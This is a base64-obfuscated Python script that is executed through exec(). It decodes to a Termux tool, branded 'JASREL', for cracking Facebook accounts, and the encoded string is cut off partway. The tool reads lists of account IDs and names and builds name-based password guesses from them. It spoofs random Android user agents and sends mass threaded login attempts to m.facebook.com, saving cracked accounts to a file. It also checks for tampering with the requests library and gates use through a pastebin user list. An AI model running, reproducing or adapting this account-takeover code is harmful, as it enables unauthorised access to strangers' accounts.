#ENCODED BY : MR-Adi
#GITHUB : Mradi007
#ENCRYPTION : Py3 BASE64
import base64
exec(base64.b64decode(b'aW1wb3J0IG9zLCBzeXMKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIHNtCmZyb20gc3lzIGltcG9ydCBwbGF0Zm9ybSBhcyBwZgppbXBvcnQgdGltZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIHNwCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBodHRweAppbXBvcnQgYWlvaHR0cAppbXBvcnQgYXN5bmNpbwppbXBvcnQganNvbgojc20oJ2FwdCBpbnN0YWxsIGVzcGVhayAteScpCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cywgYnM0LCBjb25jdXJyZW50LmZ1dHVyZXMsIHV1aWQsIHN0cmluZywgcmljaAogICAgZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBycHJpbnQKICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZAogICAgZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgYnNvdXAKICAgIGZyb20gdXVpZCBpbXBvcnQgdXVpZDQgYXMgdWlkNApleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKICAgIHByaW50KCJJbnN0YWxsaW5nIE1pc3NpbmcgTW9kdWxlcyIpCiAgICBzbSgicGlwIGluc3RhbGwgcmVxdWVzdHMgYnM0IGZ1dHVyZXMiKQojY29sb3JzCnI9Iltib2xkIHJlZF0iCmc9Iltib2xkIGdyZWVuXSIKYj0iW2JvbGQgYmx1ZV0iCnk9Iltib2xkIHllbGxvd10iCm09Iltib2xkIG1hZ2VudGFdIgpjPSJbYm9sZCBjeWFuXSIKdz0iW2JvbGQgd2hpdGVdIgphc3luYyBkZWYgYnlwYXNzKCk6CiAgZmlsZSA9IG9wZW4oJy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy9hcGkucHknLCdyJykKICBmaWxlMiA9IG9wZW4oJy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy9zZXNzaW9ucy5weScsJ3InKQogIGZpbGUzID0gb3BlbignL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvcHl0aG9uMy4xMS9zaXRlLXBhY2thZ2VzL3JlcXVlc3RzL21vZGVscy5weScsJ3InKQogIGRhdGEgPSBmaWxlLnJlYWQoKQogIHNlc3MgPSBmaWxlMi5yZWFkKCkKICBhcHByb3ZlID0gZmlsZTMucmVhZCgpCiAga2V5d29yZCA9KCJwcmludCh1cmwpIikKICBrZXl3b3JkMiA9ICgicHJpbnQoZGF0YSkiKQogIGlmIGtleXdvcmQgaW4gZGF0YSBvciAiZWNobyIgaW4gZGF0YSBvciAicHByaW50IiBpbiBkYXRhOgogICAgc20oJ2NsZWFyJykKICAgIHByaW50KDEwKiJcblwwMzNbMTszMW1CT0JPIEJZUEFTUyBQQSIpCiAgICBwcmludCgiXG5cMDMzWzE7MzNtQllFIEJZRSBGSUxFUyBBSEFIQUhIQUhBIikKICAgIGV4aXQoKQogIGVsaWYgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy96ZzBEOU43WSIgaW4gYXBwcm92ZSBvciAiRFI0WCIgaW4gYXBwcm92ZSBvciAicHByaW50IiBpbiBhcHByb3ZlOgogICAgcHJpbnQoMTAqIlRyeWluZyBoYXJkIGJ5cGFzc2luZyBteSB0b29sIGxvbPCfpKPwn6Sj8J+ko/CfpKNcbiIpCiAgICBleGl0KCkKICBlbGlmIGtleXdvcmQgaW4gc2VzcyBvciAiZWNobyIgaW4gc2VzcyBvciBrZXl3b3JkMiBpbiBzZXNzIG9yICJwcHJpbnQiIGluIHNlc3Mgb3IgInByaW50KGhlYWRlcnMpIiBpbiBzZXNzIG9yICJDb25zb2xlIiBpbiBzZXNzIG9yICJ7ZGF0YX0iIGluIHNlc3Mgb3IgInt1cmx9IiBpbiBzZXNzIG9yICJ7aGVhZGVyc30iIGluIHNlc3M6CiAgICBzbSgnY2xlYXInKQogICAgcHJpbnQoMjAqIlxuQ0FQVFVSRSBEQVRBIFBBIEhBSEFIQUhBSEEiKQogICAgcHJpbnQoIlxuXDAzM1sxOzMxbUJZRSBCWUUgRklMRVMiKQogICAgZXhpdCgpCiAgZWxzZToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgeGM9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaG5IWDJKOEIiKS50ZXh0CiAgICBvcGVuKCIudXNlci50eHQiLCd3Jykud3JpdGUoeGMpCiAgICB4eD1vcGVuKCIudXNlci50eHQiLCdyJykucmVhZGxpbmVzKCkKICAgIHJwcmludCgiW2JvbGQgZ3JlZW5dQ0hFQ0tJTkcgVE9UQUwgVVNFUlNbL10iKQogICAgc3AoNSkKICAgIHJwcmludChmIltib2xkIGdyZWVuXVRvdGFsIFVzZXI6IFtib2xkIGN5YW5de2xlbih4eCl9Wy9dIikKICAgIHNwKDQpCiAgICBpZiBsZW4oeHgpID4gNToKICAgICAgcnByaW50KCJbYm9sZCByZWRdT05MWSA1IFVTRVJTIENBTiBVU0UgVEhJUyBUT09MWy9dIikKICAgICAgZXhpdCgpCiAgICBlbHNlOgogICAgICBhd2FpdCBtYWluKCkKI2xvZ28KZGVmIGNsZWFyKCk6CiAgICBpZiBwZiBpbiBbJ3dpbjMyJywnd2luNjQnXToKICAgICAgICBzbSgnY2xzJykKICAgIGVsc2U6CiAgICAgICAgc20oJ2NsZWFyJykKI3VhCm1vZD1bXQp1YT1bXQp4eHh4PW9wZW4oJ2Rldi5qc29uJywncicpLnJlYWQoKQpibmI9anNvbi5sb2Fkcyh4eHh4KQojYm5iPWh0dHB4LmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BiYWtvbmR5L2FuZHJvaWQtZGV2aWNlLWxpc3QvbWFzdGVyL2RldmljZXMuanNvbiIpLmpzb24oKQpmb3IgYm5ibSBpbiBibmI6CiAgbW9kLmFwcGVuZChibmJtWydtb2RlbCddKQogICAgI2lmICJHVC0iIGluIGJuYm1bJ21vZGVsJ10gb3IgIlJNWCIgaW4gYm5ibVsnbW9kZWwnXSBvciAiT1BQTyIgaW4gYm5ibVsnbW9kZWwnXSBvciAiU00tIiBpbiBibmJtWydtb2RlbCddIG9yICJDUEgiIGluIGJuYm1bJ21vZGVsJ10gb3IgIkxHIiBpbiBibmJtWydtb2RlbCddIG9yICJNMjAwIiBpbiBibmJtWydtb2RlbCddIG9yICJ2aXZvIiBpbiBibmJtWydtb2RlbCddIG9yICJMZW5vdm8iIGluIGJuYm1bJ21vZGVsJ10gb3IgIm1vdG9yb2xhIiBpbiBibmJtWydtb2RlbCddIG9yICdTQU1TVU5HJyBpbiBibmJtWydtb2RlbCddIG9yICJTQU1TVU5HIiBpbiBibmJtWydtb2RlbCddIG9yICJBU1VTIiBpbiBibmJtWydtb2RlbCddIG9yICJNSSAiIGluIGJuYm1bJ21vZGVsJ10gb3IgIkluZmluaXgiIGluIGJuYm1bJ21vZGVsJ10gb3IgIkhVQVdFSSIgaW4gYm5ibVsnbW9kZWwnXSBvciAiUmVkbWkiIGluIGJuYm1bJ21vZGVsJ10gb3IgIlpURSIgaW4gYm5ibVsnbW9kZWwnXToKZm9yIGFnZW50IGluIHJhbmdlKDkwMDAwLDk5OTk5KToKICAgIG1vZGVsPXJhbmRvbS5jaG9pY2UobW9kKQogICAgZmZmPWYie3JhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKX17cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pfXtyYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSl9e3JhbmRvbS5yYW5kaW50KDIwLDk5KX17cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pfSIKICAgIHFwMWE9KGYie3JhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKX17cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pfXtyYW5kb20ucmFuZGludCgwLDkpfXtyYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSl9LntyYW5kb20ucmFuZGludCgxMDAwMDAsMjEwMDAwKX0uMHtyYW5kb20ucmFuZGludCgxMCwzNSl9IikKICAgIGlhYj1mIltGQl9JQUIve3JhbmRvbS5jaG9pY2UoWydGQjRBJywnTUVTU0VOR0VSJywnT3JjYS1BbmRyb2lkJywnTWVzc2VuZ2VyTGl0ZSddKX07RkJBVi97cmFuZG9tLnJhbmRpbnQoODAsNDAwKX0uMC4wLntyYW5kb20ucmFuZGludCgxMCwyNSl9LntyYW5kb20ucmFuZGludCgxMDAsMzAwKX07XSIKICAgIGZiYW49ZiJbRkJBTi9FTUE7RkJMQy9lbl9VUztGQkFWL3tyYW5kb20ucmFuZGludCg4MCw0MDApfS4wLjAue3JhbmRvbS5yYW5kaW50KDEwLDMwKX0ue3JhbmRvbS5yYW5kaW50KDEwMCwyMDApfTtdIgogICAgZmlyZWY9ZiJGaXJlZm94L3tyYW5kb20ucmFuZGludCg3MCwxMjApfXtyYW5kb20uY2hvaWNlKFsnLjAnLCcuMCcsJy4xJywnLjInLCcuMycsJy4xLjEnLCcuMS4yJywnLjEuMCcsJy4xLjEnLCcuMS4zJywnLjEuNCcsJy4yLjAnLCcuMi4xJywnLjIuMicsJy4yLjMnLCcuMy4wJywnLjMuMScsJy4zLjInLCcuMy4zJywnLjQuMCddKX0iCiAgICByYW5iPXJhbmRvbS5jaG9pY2UoW3FwMWFdKQogICAgbGFzPXJhbmRvbS5jaG9pY2UoW2lhYixmYmFuLGZpcmVmXSkKICAgIGZpcmVmb3g9ZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge3JhbmRvbS5yYW5kaW50KDQsMTMpfTsge21vZGVsfSBCdWlsZC97cmFuYn0pIEdlY2tvLzExNC4wIHtmaXJlZn0iCiAgICBtb3o9ZiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge3JhbmRvbS5yYW5kaW50KDQsMTMpfTsge21vZGVsfSBCdWlsZC97cmFuYn0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS97cmFuZG9tLnJhbmRpbnQoOTAsMTE3KX0uMC57cmFuZG9tLnJhbmRpbnQoNDAwMCw2MDAwKX0ue3JhbmRvbS5yYW5kaW50KDMwLDE1MCl9IE1vYmlsZSBTYWZhcmkvNTM3LjM2IHtsYXN9IgogICAga2l3aT1mIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7cmFuZG9tLnJhbmRpbnQoNCwxMyl9OyB7bW9kZWx9IEJ1aWxkL3tyYW5ifSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgS2l3aSBDaHJvbWUve3JhbmRvbS5yYW5kaW50KDkwLDExNyl9LjAue3JhbmRvbS5yYW5kaW50KDQwMDAsNjAwMCl9LntyYW5kb20ucmFuZGludCgzMCwxNTApfSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKICAgIHJhbj1yYW5kb20uY2hvaWNlKFttb3osa2l3aSxmaXJlZm94XSkKICAgIHVhLmFwcGVuZChyYW4pCmRlZiBqb2luZWQoaWRzKToKICAgIGlmIGxlbihpZHMpPT0xNToKICAgICAgICBpZiBpZHNbOjEwXSBpbiBbJzEwMDAwMDAwMDAnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAwOScKICAgICAgICBlbGlmIGlkc1s6OV0gaW4gWycxMDAwMDAwMDAnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAwOScKICAgICAgICBlbGlmIGlkc1s6OF0gaW4gWycxMDAwMDAwMCddOmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDA5JwogICAgICAgIGVsaWYgaWRzWzo3XSBpbiBbJzEwMDAwMDAnLCcxMDAwMDAxJywnMTAwMDAwMicsJzEwMDAwMDMnLCcxMDAwMDA0JywnMTAwMDAwNSddOmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDA5JwogICAgICAgIGVsaWYgaWRzWzo3XSBpbiBbJzEwMDAwMDYnLCcxMDAwMDA3JywnMTAwMDAwOCcsJzEwMDAwMDknXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxMCcKICAgICAgICBlbGlmIGlkc1s6Nl0gaW4gWycxMDAwMDEnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxMFtib2xkIHdoaXRlXS9bYm9sZCB5ZWxsb3ddMjAxMScKICAgICAgICBlbGlmIGlkc1s6Nl0gaW4gWycxMDAwMDInLCcxMDAwMDMnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxMVtib2xkIHdoaXRlXS9bYm9sZCB5ZWxsb3ddMjAxMicKICAgICAgICBlbGlmIGlkc1s6Nl0gaW4gWycxMDAwMDQnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxMltib2xkIHdoaXRlXS9bYm9sZCB5ZWxsb3ddMjAxMycKICAgICAgICBlbGlmIGlkc1s6Nl0gaW4gWycxMDAwMDUnLCcxMDAwMDYnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxM1tib2xkIHdoaXRlXS9bYm9sZCB5ZWxsb3ddMjAxNCcKICAgICAgICBlbGlmIGlkc1s6Nl0gaW4gWycxMDAwMDcnLCcxMDAwMDgnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxNC8yMDE1Wy9dJwogICAgICAgIGVsaWYgaWRzWzo2XSBpbiBbJzEwMDAwOSddOmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDE1JwogICAgICAgIGVsaWYgaWRzWzo1XSBpbiBbJzEwMDAxJ106Y3JlYXRpb24gPSAnW2JvbGQgeWVsbG93XTIwMTVbYm9sZCB3aGl0ZV0vW2JvbGQgeWVsbG93XTIwMTYnCiAgICAgICAgZWxpZiBpZHNbOjVdIGluIFsnMTAwMDInXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAxNltib2xkIHdoaXRlXS9bYm9sZCB5ZWxsb3ddMjAxNycKICAgICAgICBlbGlmIGlkc1s6NV0gaW4gWycxMDAwMyddOmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDE4W2JvbGQgd2hpdGVdL1tib2xkIHllbGxvd10yMDE5JwogICAgICAgIGVsaWYgaWRzWzo1XSBpbiBbJzEwMDA0J106Y3JlYXRpb24gPSAnW2JvbGQgeWVsbG93XTIwMTlbYm9sZCB3aGl0ZV0vW2JvbGQgeWVsbG93XTIwMjAnCiAgICAgICAgZWxpZiBpZHNbOjVdIGluIFsnMTAwMDUnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAyMCcKICAgICAgICBlbGlmIGlkc1s6NV0gaW4gWycxMDAwNicsJzEwMDA3J106Y3JlYXRpb24gPSAnW2JvbGQgeWVsbG93XTIwMjEnCiAgICAgICAgZWxpZiBpZHNbOjVdIGluIFsnMTAwMDgnXTpjcmVhdGlvbiA9ICdbYm9sZCB5ZWxsb3ddMjAyMicKICAgICAgICBlbHNlOmNyZWF0aW9uPSdbYm9sZCB5ZWxsb3ddMjAyMycKICAgIGVsaWYgbGVuKGlkcykgaW4gWzksMTBdOmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDA4LzIwMDknCiAgICBlbGlmIGxlbihpZHMpPT04OmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDA3LzIwMDgnCiAgICBlbGlmIGxlbihpZHMpPT03OmNyZWF0aW9uID0gJ1tib2xkIHllbGxvd10yMDA2LzIwMDcnCiAgICBlbHNlOmNyZWF0aW9uPSdbYm9sZCB5ZWxsb3ddMjAyMycKICAgIHJldHVybiBjcmVhdGlvbgpkZWYgbG9nbygpOgogICAgcnByaW50KCIiIgoKICAgICAgICAgICAgICB7feKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl3t94paI4paI4pWXICDilojilojilZd7fSDilojilojilojilojilojilZcge30g4paI4paI4paI4paI4paI4pWXCiAgICAgICAgICAgICAge33ilojilojilZTilZDilZDilZDilZDilZ17feKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVnXt94paI4paI4pWU4pWQ4pWQ4paI4paI4pWXe33ilojilojilZTilZDilZDilojilojilZcKICAgICAgICAgICAgICB7feKWiOKWiOKWiOKWiOKWiOKVl3t9ICAg4pWa4paI4paI4paI4pWU4pWdIHt94paI4paI4pWRICDilZrilZDilZ17feKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkQogICAgICAgICAgICAgIHt94paI4paI4pWU4pWQ4pWQ4pWde30gICDilojilojilZTilojilojilZcge33ilojilojilZEgIOKWiOKWiOKVl3t94paI4paI4pWU4pWQ4pWQ4paI4paI4pWRCiAgICAgICAgICAgICAge33ilojilojilojilojilojilojilojilZd7feKWiOKWiOKVlOKVneKVmuKWiOKWiOKVl3t94pWa4paI4paI4paI4paI4paI4pWU4pWde33ilojilojilZEgIOKWiOKWiOKVkQogICAgICAgICAgICAgIHt94pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWde33ilZrilZDilZ0gIOKVmuKVkOKVnXt9IOKVmuKVkOKVkOKVkOKVkOKVnSB7feKVmuKVkOKVnSAg4pWa4pWQ4pWdCgogICAgICAgICAgICAgICAgICAgIEpBU1JFTCDwn5SlCnt9Wy9dIiIiLmZvcm1hdChyLGcsYix5LHIsZyxiLHkscixnLGIseSxyLGcsYix5LHIsZyxiLHkscixnLGIseSwiW2JvbGQgY3lhbl09Iipvcy5nZXRfdGVybWluYWxfc2l6ZSgpLmNvbHVtbnMsIltib2xkIGN5YW5dPSIqb3MuZ2V0X3Rlcm1pbmFsX3NpemUoKS5jb2x1bW5zKSkKZGVmIGxpbmVzKCk6CiAgICBycHJpbnQoIltib2xkIGN5YW5dPSIqb3MuZ2V0X3Rlcm1pbmFsX3NpemUoKS5jb2x1bW5zKQphc3luYyBkZWYgbG9naW4oKToKICBjaGVjaz1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9OcjlMdVo0dSIpLnRleHQKICBjbGVhcigpCiAgbG9nbygpCiAgbG9naW49aW5wdXQoIlwwMzNbMTszNm1FbnRlciBZb3VyIFVzZXJuYW1lOiBcMDMzWzE7MzFtIikKICBpZiBsb2dpbiA9PSAiamFzcmVsIjoKICAgIGF3YWl0IG1haW4oKQogIGVsaWYgbG9naW4gaW4gY2hlY2s6CiAgICBhd2FpdCBieXBhc3MoKQogIGVsc2U6CiAgICBzeXMuZXhpdCgpCmxvb3A9MApva3M9W10KY3BzPVtdCmRlZiBtYWluKCk6CiAgICB0cnk6CiAgICAgICAgY2xlYXIoKQogICAgICAgIGxvZ28oKQogICAgICAgIHJwcmludCgiIHt9W3t9MXt9XSB7fUZpbGUgQ2xvbmluZ1xuIHt9W3t9Mnt9XXt9IEV4aXQiLmZvcm1hdChtLGMsbSxnLG0sYyxtLHIpKQogICAgICAgIGxpbmVzKCkKICAgICAgICB4eD1pbnB1dCgiIFwwMzNbMTszNm1DaG9vc2UgTnVtYmVyOiBcMDMzWzE7MzdtIikKICAgICAgICBpZiB4eCA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyKCkKICAgICAgICAgICAgbG9nbygpCiAgICAgICAgICAgIGZpPWlucHV0KCJcMDMzWzE7MzZtIEVudGVyIFlvdXIgRmlsZTogXDAzM1sxOzM3bSIpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZpMj1vcGVuKGZpLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBycHJpbnQoInt9RmlsZSBOb3QgRm91bmQiLmZvcm1hdChyKSkKICAgICAgICAgICAgICAgIHNwKDMpCiAgICAgICAgICAgICAgICBtYWluKCkKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBsb2dvKCkKICAgICAgICAgICAgcnByaW50KCIge31DaG9vc2UgTWV0aG9kXG5cbiB7fVt7fTF7fV17fSBNZXRob2QgMSB7fSh7fURvZXNuJ3QgQ29uc3VtZSBNdWNoIEdCe30pXG4ge31be30ye31de30gTWV0aG9kIDJ7fSAoe31GQVNUe30pWy9dIi5mb3JtYXQoeSxtLGMsbSx5LGMsZyxjLG0sYyxtLHksYyxnLGMpKQogICAgICAgICAgICBsaW5lcygpCiAgICAgICAgICAgIG1ldGg9aW5wdXQoIlwwMzNbMTszMm0gQ2hvb3NlIE1ldGhvZDogXDAzM1sxOzM2bSIpCiAgICAgICAgICAgIGxpbmVzKCkKICAgICAgICAgICAgcGFzc3c9W10KICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcGFzX2xpbWl0PWludChpbnB1dCgie31Ib3cgTWFueSBQYXNzd29yZHM6Ii5mb3JtYXQoIlwwMzNbMTszMm0iKSkpO2xpbmVzKCkKICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgICAgICBwYXNfbGltaXQ9MQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShwYXNfbGltaXQpOgogICAgICAgICAgICAgICAgeD1pbnB1dChmIkVudGVyIFBhc3N3b3JkIHtpKzF9OiAiKQogICAgICAgICAgICAgICAgcGFzc3cuYXBwZW5kKHgpCiAgICAgICAgICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz0zMCkgYXMgZXhjYV9zdWI6CiAgICAgICAgICAgICAgICBjbGVhcigpCiAgICAgICAgICAgICAgICBsb2dvKCkKICAgICAgICAgICAgICAgIHByaW50KGYiIFwwMzNbMTszMm1Ub3RhbCBJRFM6XDAzM1sxOzM2bSB7bGVuKGZpMil9XG4gXDAzM1sxOzMybVBhc3N3b3JkczpcMDMzWzE7MzJtIHtsZW4ocGFzc3cpfSIpCiAgICAgICAgICAgICAgICBsaW5lcygpCiAgICAgICAgICAgICAgICBwcmludCgiIFwwMzNbMTszMm1PSyBJRFMgU0FWRSBJTlxuL3NkY2FyZC9qYXNyZWwtb2sudHh0IikKICAgICAgICAgICAgICAgIGxpbmVzKCkKICAgICAgICAgICAgICAgIGZvciB1c2VyIGluIGZpMjoKICAgICAgICAgICAgICAgICAgICBpZHMsbmFtZXM9dXNlci5zcGxpdCgifCIpCiAgICAgICAgICAgICAgICAgICAgcGFzc2xpc3Q9cGFzc3cKICAgICAgICAgICAgICAgICAgICBpZiBtZXRoIGluIFsnMScsJzAxJ106CiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2Ffc3ViLnN1Ym1pdChtMSxpZHMsbmFtZXMscGFzc2xpc3QpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBtZXRoIGluIFsnMicsJzAyJ106CiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2Ffc3ViLnN1Ym1pdChtMixpZHMsbmFtZXMscGFzc2xpc3QpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGxpbmVzKCkKICAgICAgICAgICAgcnByaW50KCJ7fSBDcmFja2luZyBJcyBGaW5pc2giLmZvcm1hdChnKSkKICAgICAgICAgICAgbGluZXMoKQogICAgICAgICAgICBycHJpbnQoInt9IE9LIElEUy97fSIuZm9ybWF0KGcsbGVuKG9rcykpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJwcmludCgiIFtib2xkIHJlZF1RVUlUVElOR1svXSIpCiAgICAgICAgICAgIHNwKDUpCiAgICAgICAgICAgIGV4aXQoKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgZXhpdCgpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgcHJpbnQoJ1xuIE5vIGludGVybmV0IGNvbm5lY3Rpb24gLi4uJykKICAgICAgICBleGl0KCkKZGVmIG0xKGlkcyxuYW1lcyxwYXNzbGlzdCk6CiAgICBnbG9iYWwgbG9vcCxva3MsY3BzCiAgICBzeXMuc3Rkb3V0LndyaXRlKCJcclxyXDAzM1sxOzM2bSBFWENBXDAzM1sxOzM1bShcMDMzWzE7MzdtJXNcMDMzWzE7MzVtKSBcMDMzWzE7MzJtT0vigKIlcyBcMDMzWzE7MzFtQ1DigKIlcyIlKGxvb3AsbGVuKG9rcyksbGVuKGNwcykpKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgIHNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpCiAgICB0cnk6CiAgICAgICAgZmlyc3QgPSBuYW1lcy5zcGxpdCgiICIpWzBdCiAgICAgICAgdHJ5OgogICAgICAgICAgICBsYXN0ID0gbmFtZXMuc3BsaXQoIiAiKVsxXQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgbGFzdCA9ICJFeGNhIgogICAgICAgIGZzPWZpcnN0Lmxvd2VyKCkKICAgICAgICBsYXM9bGFzdC5sb3dlcigpCiAgICAgICAgZm9yIHBhc3MyIGluIHBhc3NsaXN0OgogICAgICAgICAgICBwYXMgPSBwYXNzMi5yZXBsYWNlKCdGaXJzdCcsZmlyc3QpLnJlcGxhY2UoIkxhc3QiLGxhc3QpLnJlcGxhY2UoImZpcnN0IixmcykucmVwbGFjZSgibGFzdCIsbGFzKQogICAgICAgICAgICBjY2M9cmFuZG9tLmNob2ljZSh1YSkKICAgICAgICAgICAgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml0eSc6ICdtLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcnLAogICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjknLAogICAgICAgICAgICAgICAgICAgICdjYWNoZS1jb250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnLAogICAgICAgICAgICAgICAgICAgICdkcHInOiAnMycsCiAgICAgICAgICAgICAgICAgICAgJ29yaWdpbic6ICdodHRwczovL20uZmFjZWJvb2suY29tJywKICAgICAgICAgICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmbG9naW5fZnJvbV9heW1oPTEmcmVmaWQ9OCcsCiAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdkYXJrJywKICAgICAgICAgICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJOb3RfQSBCcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iM